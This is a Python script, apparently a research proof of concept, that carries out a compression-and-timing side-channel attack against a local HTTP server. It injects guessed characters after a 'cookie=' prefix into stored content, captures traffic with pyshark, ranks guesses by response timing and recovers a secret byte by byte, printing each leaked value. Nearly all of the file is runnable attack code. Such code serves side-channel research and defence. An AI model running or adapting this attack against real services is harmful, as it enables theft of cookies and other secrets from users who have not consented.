#!/usr/bin/env python3

import os
import sys
import re
from collections import defaultdict
from requests.api import request
from tqdm import trange
import rdtsc
import random
import requests
import numpy as np
import warnings
warnings.simplefilter(action='ignore', category=FutureWarning)
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import click
import signal
import pyshark
import threading
import time
usleep = lambda x: time.sleep(x/1000000.0)

RUNS = 200
DICT_SIZE = 100
SECRET = "SECRET"
dictionary = [SECRET]
# alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~ "
dict_alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
TIMING_SOURCE = 'Prev TS Frame'

measurements = []
capture_thread = None

class CapturePySharkThreadHttp1(threading.Thread):
    def __init__(self, group=None, target=None, name=None, interface="lo", tcp_port=8080, args=(), kwargs={}):
        threading.Thread.__init__(self, group, target, name, args=args, kwargs=kwargs)
        self._capture = pyshark.LiveCapture(interface=interface,
                                            bpf_filter=f'tcp port {tcp_port}',
                                            decode_as={f'tcp.port=={tcp_port}': 'http'}, # decode as http2
                                            use_json=True,
                                            include_raw=True,
                                            )
        self._return = None
        self._stopping = False

    def run(self):
        self._stopping = False
        # self._capture.apply_on_packets(self.packet_callback)
        parsing_tracker = {}
        for packet in self._capture.sniff_continuously():
            if 'http' in packet:
                if packet.http.has_field('full_uri'):
                    all_fields = vars(packet.http)['_all_fields']
                    # yes keep mega ugly I like it
                    request_uri = list(all_fields.keys())[0] # mega ugly
                    
                    if 'get_id' in str(request_uri):
                        ack_raw = packet.tcp.ack_raw
                        current_offset = int(re.search(r'=(\d+)', request_uri).group(1))
                        #begin = self.__to_timestamp(packet.sniff_timestamp)
                        split = packet.sniff_timestamp.split(".")
                        upper = int(split[0])*1e9
                        lower = int(split[1])
                        begin = upper + lower
                        parsing_tracker[ack_raw] = (int(current_offset), begin)

                        continue

            flags = packet.tcp.get_field("flags_tree")
            if int(flags.get_field('push')) == 1 and int(flags.get_field('ack')) == 1:
                #print(packet.tcp)
                if packet.tcp.seq_raw in parsing_tracker:
                    offset, begin = parsing_tracker[packet.tcp.seq_raw]
                    #end = self.__to_timestamp(packet.sniff_timestamp)
                    #diff = self.__diff_to_ns(end - begin)
                    split = packet.sniff_timestamp.split(".")
                    upper = int(split[0])*1e9
                    lower = int(split[1])
                    end = upper + lower
                    diff = end - begin
                    all_fields = vars(packet.tcp)['_all_fields']
                    if 'tcp.time_delta' in all_fields['Timestamps']: 
                        time_since_previous_frame = int(float(all_fields['Timestamps']['tcp.time_delta']) * 1000000000)
                    else:
                        time_since_previous_frame = np.NaN
                    
                    if 'tcp.time_relative' in all_fields['Timestamps']:
                        time_relative = int(float(all_fields['Timestamps']['tcp.time_relative']) * 1000000000)
                    else:
                        time_relative = np.NaN

                    #print(f"Ack:{packet.tcp.seq_raw}, Offset: {offset}")
                    #print(offset)
                    m = (
                        offset, # 'Secret'
                        diff, # 'Timestamp'
                        time_relative, # 'Time Relative'
                        time_since_previous_frame # 'Prev TS Frame'
                    )
                    
                    measurements.append(m)
                    del parsing_tracker[packet.tcp.seq_raw]
            if self._stopping : break

    def stop(self):
        self._stopping = True

def gen_dictionary():
    for i in range(DICT_SIZE-1):
        dictionary.append(''.join(random.choices(dict_alphabet, k=len(SECRET))))
    random.shuffle(dictionary)
    assert(len(dictionary) == DICT_SIZE)

def post_content(server_url, id, content):
    r = requests.post(f'{server_url}/post_id', data={'id':id, 'data':content})
    value = r.content.decode('utf-8')
    return value

def get_content(server_url, id):
    params = {"id":id}
    start = rdtsc.get_cycles()
    r = requests.get(f'{server_url}/get_id',params=params)
    end = rdtsc.get_cycles()
    value = r.content.decode('utf-8')
    return int(value)
    # return end - start


def reset_db(server_url):
    r = requests.get(f'{server_url}/reset')
    value = r.content.decode('utf-8')
    assert(value == 'reset')

def store_logs(id):
    measurements_df = pd.DataFrame(data=measurements, columns=['Secret', 'Timestamp', 'Time Relative', 'Prev TS Frame'])
    measurements_df.to_csv(f'measurements{id}.csv')

def signal_handler(sig, frame):
    store_logs('_sig')

    if capture_thread is not None:
        capture_thread.stop()

    sys.exit(0)

@click.command()
@click.argument('template-path', type=click.Path(exists=True))
@click.option('-h','--hostname', type=str, default="localhost")
@click.option('-p','--port',type=int,default=8080)
@click.option('-i','--interface',type=str,default="lo")
@click.option('-o', '--output', type=click.Path())
def main(template_path, hostname, port, interface, output):
    global capture_thread

    with open(template_path, "r") as f:
        template = f.read()
    
    print("template orig size:", len(template))

    server_url = f"http://{hostname}:{port}"
    reset_db(server_url)

    leaked = ""
    prefix = "cookie="
    SECRET_LEN = 6


    # Install signal handler to catch ctrl+c
    signal.signal(signal.SIGINT, signal_handler)

    for byte_guess in range(0,SECRET_LEN):
        capture_thread = CapturePySharkThreadHttp1(interface=interface,tcp_port=port)

        # reset db to avoid id clashing
        reset_db(server_url)
        compressed_sizes = defaultdict(int)
        for b in range(32,127):
            guess = chr(b)
            prefixed_guess = (prefix + leaked + guess)[byte_guess:]
            assert len(prefixed_guess) == 8
            size = post_content(server_url, str(b), template.replace("@@@@@@@@", prefixed_guess))
            compressed_sizes[size] += 1

        print("compressed sizes:", compressed_sizes)


        capture_thread.start()
        usleep(1000000) # wait a bit for thread to start

        # warm-up
        for i in range(5):
            for b in range(32,127):
                get_content(server_url, str(b))

        columns = ["Secret", "Delta"]
        data = []

        attack_start_ts = time.clock_gettime(time.CLOCK_MONOTONIC) 
        for i in trange(RUNS):
            for b in range(32,127):
                t = get_content(server_url, str(b))

                data.append([b, t])
                # print(end - start, records[0][:10])
        attack_end_ts = time.clock_gettime(time.CLOCK_MONOTONIC)
        with open("results.csv","a") as f:
            f.write(f"{attack_end_ts-attack_start_ts}\n")

        print("stopping thread")
        capture_thread.stop()
        usleep(1000000) # wait a bit for thread to stop
        capture_thread.join() # ensure stopped
        store_logs(byte_guess)
        df = pd.DataFrame(data=measurements, columns=['Secret', 'Timestamp', 'Time Relative', 'Prev TS Frame'])
        print(df.groupby('Secret').median().sort_values(by='Prev TS Frame',ascending=False))
        leaked += chr(df.groupby('Secret').median().sort_values(by='Prev TS Frame',ascending=False).index[0])
        measurements.clear()
        print(f'LEAKED: {leaked}')
        # if df.groupby('Secret').median().sort_values(by='Prev TS Frame',ascending=False).index[0] != SECRET:
        #     print("ERROR")
        #     print(df.groupby('Secret').median().sort_values(by='Prev TS Frame',ascending=False))

        # df = pd.DataFrame(data=data, columns=columns)
        # df.to_csv('log.csv')
        # fig, ax = plt.subplots()
        # # Plot histograms
        # palette = dict(zip(dictionary, sns.color_palette("Spectral", n_colors=len(dictionary))))
        # histplot = sns.histplot(df, ax=ax, x=TIMING_SOURCE, hue="Secret", palette=palette, element="step", kde=True)
        # medians = df.groupby(["Secret"])[TIMING_SOURCE].median()
        # for word, median in medians.items():
        #     plt.axvline(median, linewidth=1, color=palette[word])

    # https://github.com/mwaskom/seaborn/issues/2280
    # def move_legend(ax, **kws):
    #     old_legend = ax.legend_
    #     handles = old_legend.legendHandles
    #     labels = [t.get_text() for t in old_legend.get_texts()]
    #     title = old_legend.get_title().get_text()
    #     ax.legend(handles, labels, title=title, **kws)
    # move_legend(histplot, bbox_to_anchor=(1.01, 1), loc=2, ncol=2,
    #                       borderaxespad=0)
    # plt.subplots_adjust(left=0.05, right=0.88, top=0.92, bottom=0.1)
    # # Show or store
    # if output:
    #     my_dpi=96
    #     WIDTH = 1920
    #     HEIGHT = 1080
    #     fig.set_figheight(HEIGHT/my_dpi)
    #     fig.set_figwidth(WIDTH/my_dpi)
    #     median = df[TIMING_SOURCE].median()
    #     std = df[TIMING_SOURCE].std()
    #     plt.xlim([median - std, 2*median])
    #     plt.subplots_adjust(left=0.05, right=0.85, top=0.99, bottom=0.05)
    #     plt.savefig(output, dpi=300)
    # else:
    #     plt.show()

if __name__ == "__main__":
    main()
